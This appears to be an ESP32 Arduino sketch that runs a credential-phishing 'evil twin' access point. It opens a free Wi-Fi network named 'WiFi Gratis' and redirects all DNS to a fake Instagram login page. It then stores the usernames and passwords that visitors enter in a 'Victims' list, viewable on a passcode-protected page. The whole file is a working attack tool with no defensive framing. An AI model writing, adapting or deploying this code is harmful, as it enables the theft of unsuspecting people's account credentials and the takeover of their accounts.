#include <WiFiMulti.h>
#include <DNSServer.h>
#include <WebServer.h>

// Configurações da rede
const char* SSID_NAME = "WiFi Gratis";
IPAddress APIP(172, 0, 0, 1);

// Configurações do sistema
const byte DNS_PORT = 53;
const byte HTTP_CODE = 200;
DNSServer dnsServer;
WebServer webServer(80);

// Senha para acessar /pass e /clear
const String passcode = "iannxz";
String Victims = "";

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  return a.substring(0, 200);
}

String footer() {
  return "<footer><p>&copy; 2025 | All rights reserved.</p></footer>"  // Rodapé padrão
         "<div style='position: fixed; bottom: 10px; right: 10px; font-size: 14px; color: rgba(0,0,0,0.2); pointer-events: none;'>IannXz</div>"; // Marca d’água
}

String header() {
  String CSS = R"rawliteral(
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      border-radius: 8px;
    }
    .logo {
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
    }
    input[type=submit] {
      background-color: #0095f6;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
    }
    input[type=submit]:hover {
      background-color: #007cd1;
    }
    footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: #999;
    }
  )rawliteral";

  return "<!DOCTYPE html><html><head><title>Instagram</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>" + CSS + "</style></head><body>";
}

String index() {
  return header() +
         "<div class='login-container'>" +
         "<img class='logo' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAACcQAAANICAYAAADjcX7QAAAABmJLR0QA/wD/AP+gvaeTAAAgAElEQVR4nOzdeZisZ13n/3dO9pUESAh7QNn3TdZB2RFEQATcWBwEUUFFEWZ0foj7gjqiIzMI6qjjOiqi4i6KijqIIouA7KsEErJBTEK23x9P5+KQnO6cPl3d91NVr9d1fa/uNM05n/NUd9VT9Xzqvg8LWCaHVzeuztiYm1TXq66/8fG46qSN7z1' width='175'>" +
         "<form action='/post' method='post'>" +
         "<input type='text' name='username' placeholder='Phone number, username, or email'>" +
         "<input type='password' name='password' placeholder='Password'>" +
         "<input type='submit' value='Log In'>" +
         "</form></div>" + footer() + "</body></html>";
}

String posted() {
  String username = input("username");
  String password = input("password");
  Victims = "<li><b>Usuário:</b> " + username + " <b>Senha:</b> <span style='color:red'>" + password + "</span></li>" + Victims;

  return header() +
         "<div class='login-container'>" +
         "<h3>Validando login...</h3>" +
         "<p>Aguarde até 3 minutos para conexão.</p>" +
         "<meta http-equiv='refresh' content='5; url=/' />" +
         "</div>" + footer() + "</body></html>";
}

String passLogin(String target) {
  return header() +
         "<div class='login-container'>" +
         "<h3>Digite a senha de acesso</h3>" +
         "<form action='/" + target + "' method='post'>" +
         "<input type='password' name='password' placeholder='Senha'>" +
         "<input type='submit' value='Entrar'>" +
         "</form></div>" + footer() + "</body></html>";
}

String pass() {
  return header() +
         "<div class='login-container'>" +
         "<h3>Vítimas Capturadas:</h3><ol>" + Victims + "</ol>" +
         "<a href='/'>Voltar</a> | <a href='/clear?password=" + passcode + "'>Limpar</a>" +
         "</div>" + footer() + "</body></html>";
}

String clear() {
  Victims = "";
  return header() +
         "<div class='login-container'>" +
         "<h3>Lista limpa com sucesso!</h3>" +
         "<a href='/'>Voltar</a>" +
         "</div>" + footer() + "</body></html>";
}

void setup() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/", []() {
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
  });

  webServer.on("/pass", []() {
    if (webServer.hasArg("password") && webServer.arg("password") == passcode) {
      webServer.send(HTTP_CODE, "text/html", pass());
    } else {
      webServer.send(HTTP_CODE, "text/html", passLogin("pass"));
    }
  });

  webServer.on("/clear", []() {
    if (webServer.hasArg("password") && webServer.arg("password") == passcode) {
      webServer.send(HTTP_CODE, "text/html", clear());
    } else {
      webServer.send(HTTP_CODE, "text/html", passLogin("clear"));
    }
  });

  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
